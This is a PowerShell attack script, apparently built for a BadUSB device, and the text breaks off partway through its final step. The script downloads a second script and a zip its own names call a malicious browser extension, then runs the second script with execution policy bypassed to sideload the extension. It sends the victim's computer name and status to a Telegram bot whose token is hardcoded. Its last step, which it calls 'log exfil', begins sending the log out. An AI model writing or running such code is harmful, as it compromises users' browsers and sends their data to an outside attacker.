# Sideload-Orchestrator.ps1
# Downloads components and orchestrates the sideloading.

# --- Configuration ---
$Global:LogFile = "$env:TEMP\sideload_orchestrator_log.txt" # Make log file path global

# << REPLACE THESE URLS >>
$MainSideloadScriptUrl = "https://github.com/L7Dawson/badusb/raw/refs/heads/main/PS_Scripts/Sideload-Extension.ps1"
$ExtensionZipUrl = "https://github.com/L7Dawson/badusb/raw/refs/heads/main/MaliciousExtension.zip"
# << END OF URLS >>

$TempDir = "$env:TEMP\BrowserMod_Payload_$(Get-Random)" # Add random to avoid conflicts
$MainSideloadScriptPath = Join-Path $TempDir "Sideload-Extension.ps1"
$ExtensionZipPath = Join-Path $TempDir "MyMaliciousExtension.zip"
$ExtractedExtensionPath = Join-Path $TempDir "MyMaliciousExtension"

# --- Functions ---
function Write-Log {
    param([string]$Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogEntry = "[$Timestamp] $Message"
    Write-Host $LogEntry # For immediate feedback if window is visible
    Add-Content -Path $Global:LogFile -Value $LogEntry -ErrorAction SilentlyContinue
}

function Send-TelegramNotification {
    param([string]$TextMessage)
    $TelegramToken = "7565111023:AAHut-ZUJyU4E5ySxXXNNLOSHq4VPS8e6ZQ" # Your Bot Token
    $TelegramChatID = "6847777757" # Your Chat ID
    
    $SafeMessage = "[Orchestrator: $($env:COMPUTERNAME)]`n" + $TextMessage.Substring(0, [System.Math]::Min($TextMessage.Length, 3800))
    try {
        Add-Type -AssemblyName System.Web -ErrorAction SilentlyContinue
        $EncodedMessage = [System.Web.HttpUtility]::UrlEncode($SafeMessage)
        $TelegramApiUrl = "https://api.telegram.org/bot$TelegramToken/sendMessage?chat_id=$TelegramChatID&text=$EncodedMessage&parse_mode=Markdown"
        Invoke-RestMethod -Uri $TelegramApiUrl -Method Get -UseBasicParsing -TimeoutSec 15 -ErrorAction SilentlyContinue
        Write-Log "Sent Telegram notification."
    }
    catch {
        Write-Log "Error sending Telegram notification: $($_.Exception.Message)"
    }
}

# --- Main Logic ---
Clear-Content -Path $Global:LogFile -ErrorAction SilentlyContinue
Write-Log "Sideload Orchestrator Started."
Send-TelegramNotification "Orchestrator script initiated on $($env:COMPUTERNAME)."

# Create temporary directory
if (Test-Path $TempDir) {
    Write-Log "Removing existing temp directory: $TempDir"
    Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue
}
New-Item -Path $TempDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
if (-not (Test-Path $TempDir)) {
    $errMsg = "FATAL ERROR: Could not create temp directory $TempDir"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}
Write-Log "Created temp directory: $TempDir"

# Download Main Sideloading PowerShell Script
Write-Log "Downloading Sideload-Extension.ps1 from: $MainSideloadScriptUrl"
try {
    Invoke-WebRequest -Uri $MainSideloadScriptUrl -OutFile $MainSideloadScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
    Write-Log "Sideload-Extension.ps1 downloaded to: $MainSideloadScriptPath"
    if (-not (Test-Path $MainSideloadScriptPath) -or (Get-Item $MainSideloadScriptPath).Length -lt 100) {
        $errMsg = "FATAL ERROR: Sideload-Extension.ps1 ($MainSideloadScriptPath) not downloaded correctly or is empty. URL: $MainSideloadScriptUrl"
        Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
    }
    Write-Log "Sideload-Extension.ps1 appears to be downloaded successfully."
}
catch {
    $errMsg = "FATAL ERROR downloading Sideload-Extension.ps1: $($_.Exception.Message). URL: $MainSideloadScriptUrl"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}

# Download Browser Extension ZIP
Write-Log "Downloading extension ZIP from: $ExtensionZipUrl"
try {
    Invoke-WebRequest -Uri $ExtensionZipUrl -OutFile $ExtensionZipPath -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop
    Write-Log "Extension ZIP downloaded to: $ExtensionZipPath"
    if (-not (Test-Path $ExtensionZipPath) -or (Get-Item $ExtensionZipPath).Length -lt 1000) {
        $errMsg = "FATAL ERROR: Extension ZIP ($ExtensionZipPath) not downloaded correctly or is too small. URL: $ExtensionZipUrl"
        Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
    }
    Write-Log "Extension ZIP appears to be downloaded successfully."
}
catch {
    $errMsg = "FATAL ERROR downloading extension ZIP: $($_.Exception.Message). URL: $ExtensionZipUrl"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}

# Extract Browser Extension
Write-Log "Extracting extension from $ExtensionZipPath to $ExtractedExtensionPath"
try {
    Expand-Archive -Path $ExtensionZipPath -DestinationPath $ExtractedExtensionPath -Force -ErrorAction Stop
    Write-Log "Extension extracted to (short path likely): $ExtractedExtensionPath" # Log original path
    if (-not (Test-Path $ExtractedExtensionPath) -or -not (Test-Path (Join-Path $ExtractedExtensionPath "manifest.json"))) {
         $errMsg = "FATAL ERROR: Expand-Archive ran but $ExtractedExtensionPath or its manifest.json does not exist!"
         Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
    }
    Write-Log "Extension appears to be extracted successfully."
}
catch {
    $errMsg = "FATAL ERROR extracting extension ZIP: $($_.Exception.Message)"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}

# --- Resolve Extracted Path to Long Path Name ---
$longExtractedPath = $ExtractedExtensionPath # Default to original if resolve fails
try {
    # Use Get-Item | Select -ExpandProperty FullName for potentially better reliability than Resolve-Path
    $item = Get-Item -LiteralPath $ExtractedExtensionPath -Force -ErrorAction Stop
    if ($item) {
        $longExtractedPath = $item.FullName
        Write-Log "DEBUG: Resolved long path via Get-Item: $longExtractedPath"
    } else {
         Write-Log "WARN: Get-Item returned null for $ExtractedExtensionPath. Using original."
    }
} catch {
    Write-Log "WARN: Could not resolve long path for $ExtractedExtensionPath using Get-Item: $($_.Exception.Message). Using original."
}
# --- End Path Resolution ---

# Modify the Sideload-Extension.ps1 to use the resolved long path
Write-Log "Updating Sideload-Extension.ps1 with resolved extension source path: $longExtractedPath"
try {
    $sideloadScriptContent = Get-Content -Path $MainSideloadScriptPath -Raw -Encoding UTF8
    $placeholder = 'PLACEHOLDER_FOR_EXTENSION_PATH' # Must match placeholder in Sideload-Extension.ps1
    
    if ($sideloadScriptContent -match [regex]::Escape($placeholder)) {
        # Use the resolved long path here
        $sideloadScriptContent = $sideloadScriptContent.Replace($placeholder, $longExtractedPath)
        Set-Content -Path $MainSideloadScriptPath -Value $sideloadScriptContent -Force -Encoding UTF8
        Write-Log "Sideload-Extension.ps1 updated with path: $longExtractedPath"
    } else {
        $errMsg = "Placeholder '$placeholder' not found in Sideload-Extension.ps1 ($MainSideloadScriptPath). Cannot update path."
        Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
    }
}
catch {
    $errMsg = "ERROR updating Sideload-Extension.ps1: $($_.Exception.Message)"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; exit 1
}

# DEBUG: Verify path existence just before execution
Write-Log "DEBUG: Verifying existence of resolved path for Sideload-Extension.ps1: $longExtractedPath"
if (Test-Path $longExtractedPath) {
    Write-Log "DEBUG: Resolved path $longExtractedPath EXISTS."
} else {
    Write-Log "DEBUG: CRITICAL - Resolved path $longExtractedPath DOES NOT EXIST before calling Sideload-Extension.ps1."
    Send-TelegramNotification "DEBUG Orchestrator: Resolved path missing before calling Sideload-Extension.ps1: $longExtractedPath"
}

# Execute the Main Sideloading Script
Write-Log "Executing main sideloading script: $MainSideloadScriptPath"
$SideloadExitCode = 1 # Default to error
try {
    $process = Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$MainSideloadScriptPath`"" -Wait -PassThru -NoNewWindow
    $SideloadExitCode = $process.ExitCode
    Write-Log "Main sideloading script execution finished with exit code: $SideloadExitCode"
    if ($SideloadExitCode -ne 0) {
        Send-TelegramNotification "Sideload-Extension.ps1 exited with code: $SideloadExitCode. Check target logs."
    } else {
         Send-TelegramNotification "Sideload-Extension.ps1 completed with code 0. Check browser(s) after restart. Check target logs."
    }
}
catch {
    $errMsg = "FATAL ERROR executing main sideloading script (Sideload-Extension.ps1): $($_.Exception.Message)"
    Write-Log $errMsg; Send-TelegramNotification $errMsg; # Don't exit, let log exfil happen
}

# Exfiltrate the orchestrator log file to Telegram
if (Test-Path $Global:LogFile) {
    $logContent = Get-Content -Path $Global:LogFile -Raw -ErrorAction SilentlyContinue
    if ($logContent) {
        $logSnippet = $logContent.Substring(0, [System.Math]::Min($logContent.Length, 3500))
        # Use Here-String for cleaner formatting
        $telegramMessage = @"
Orchestrator Log ($($env:COMPUTERNAME)):
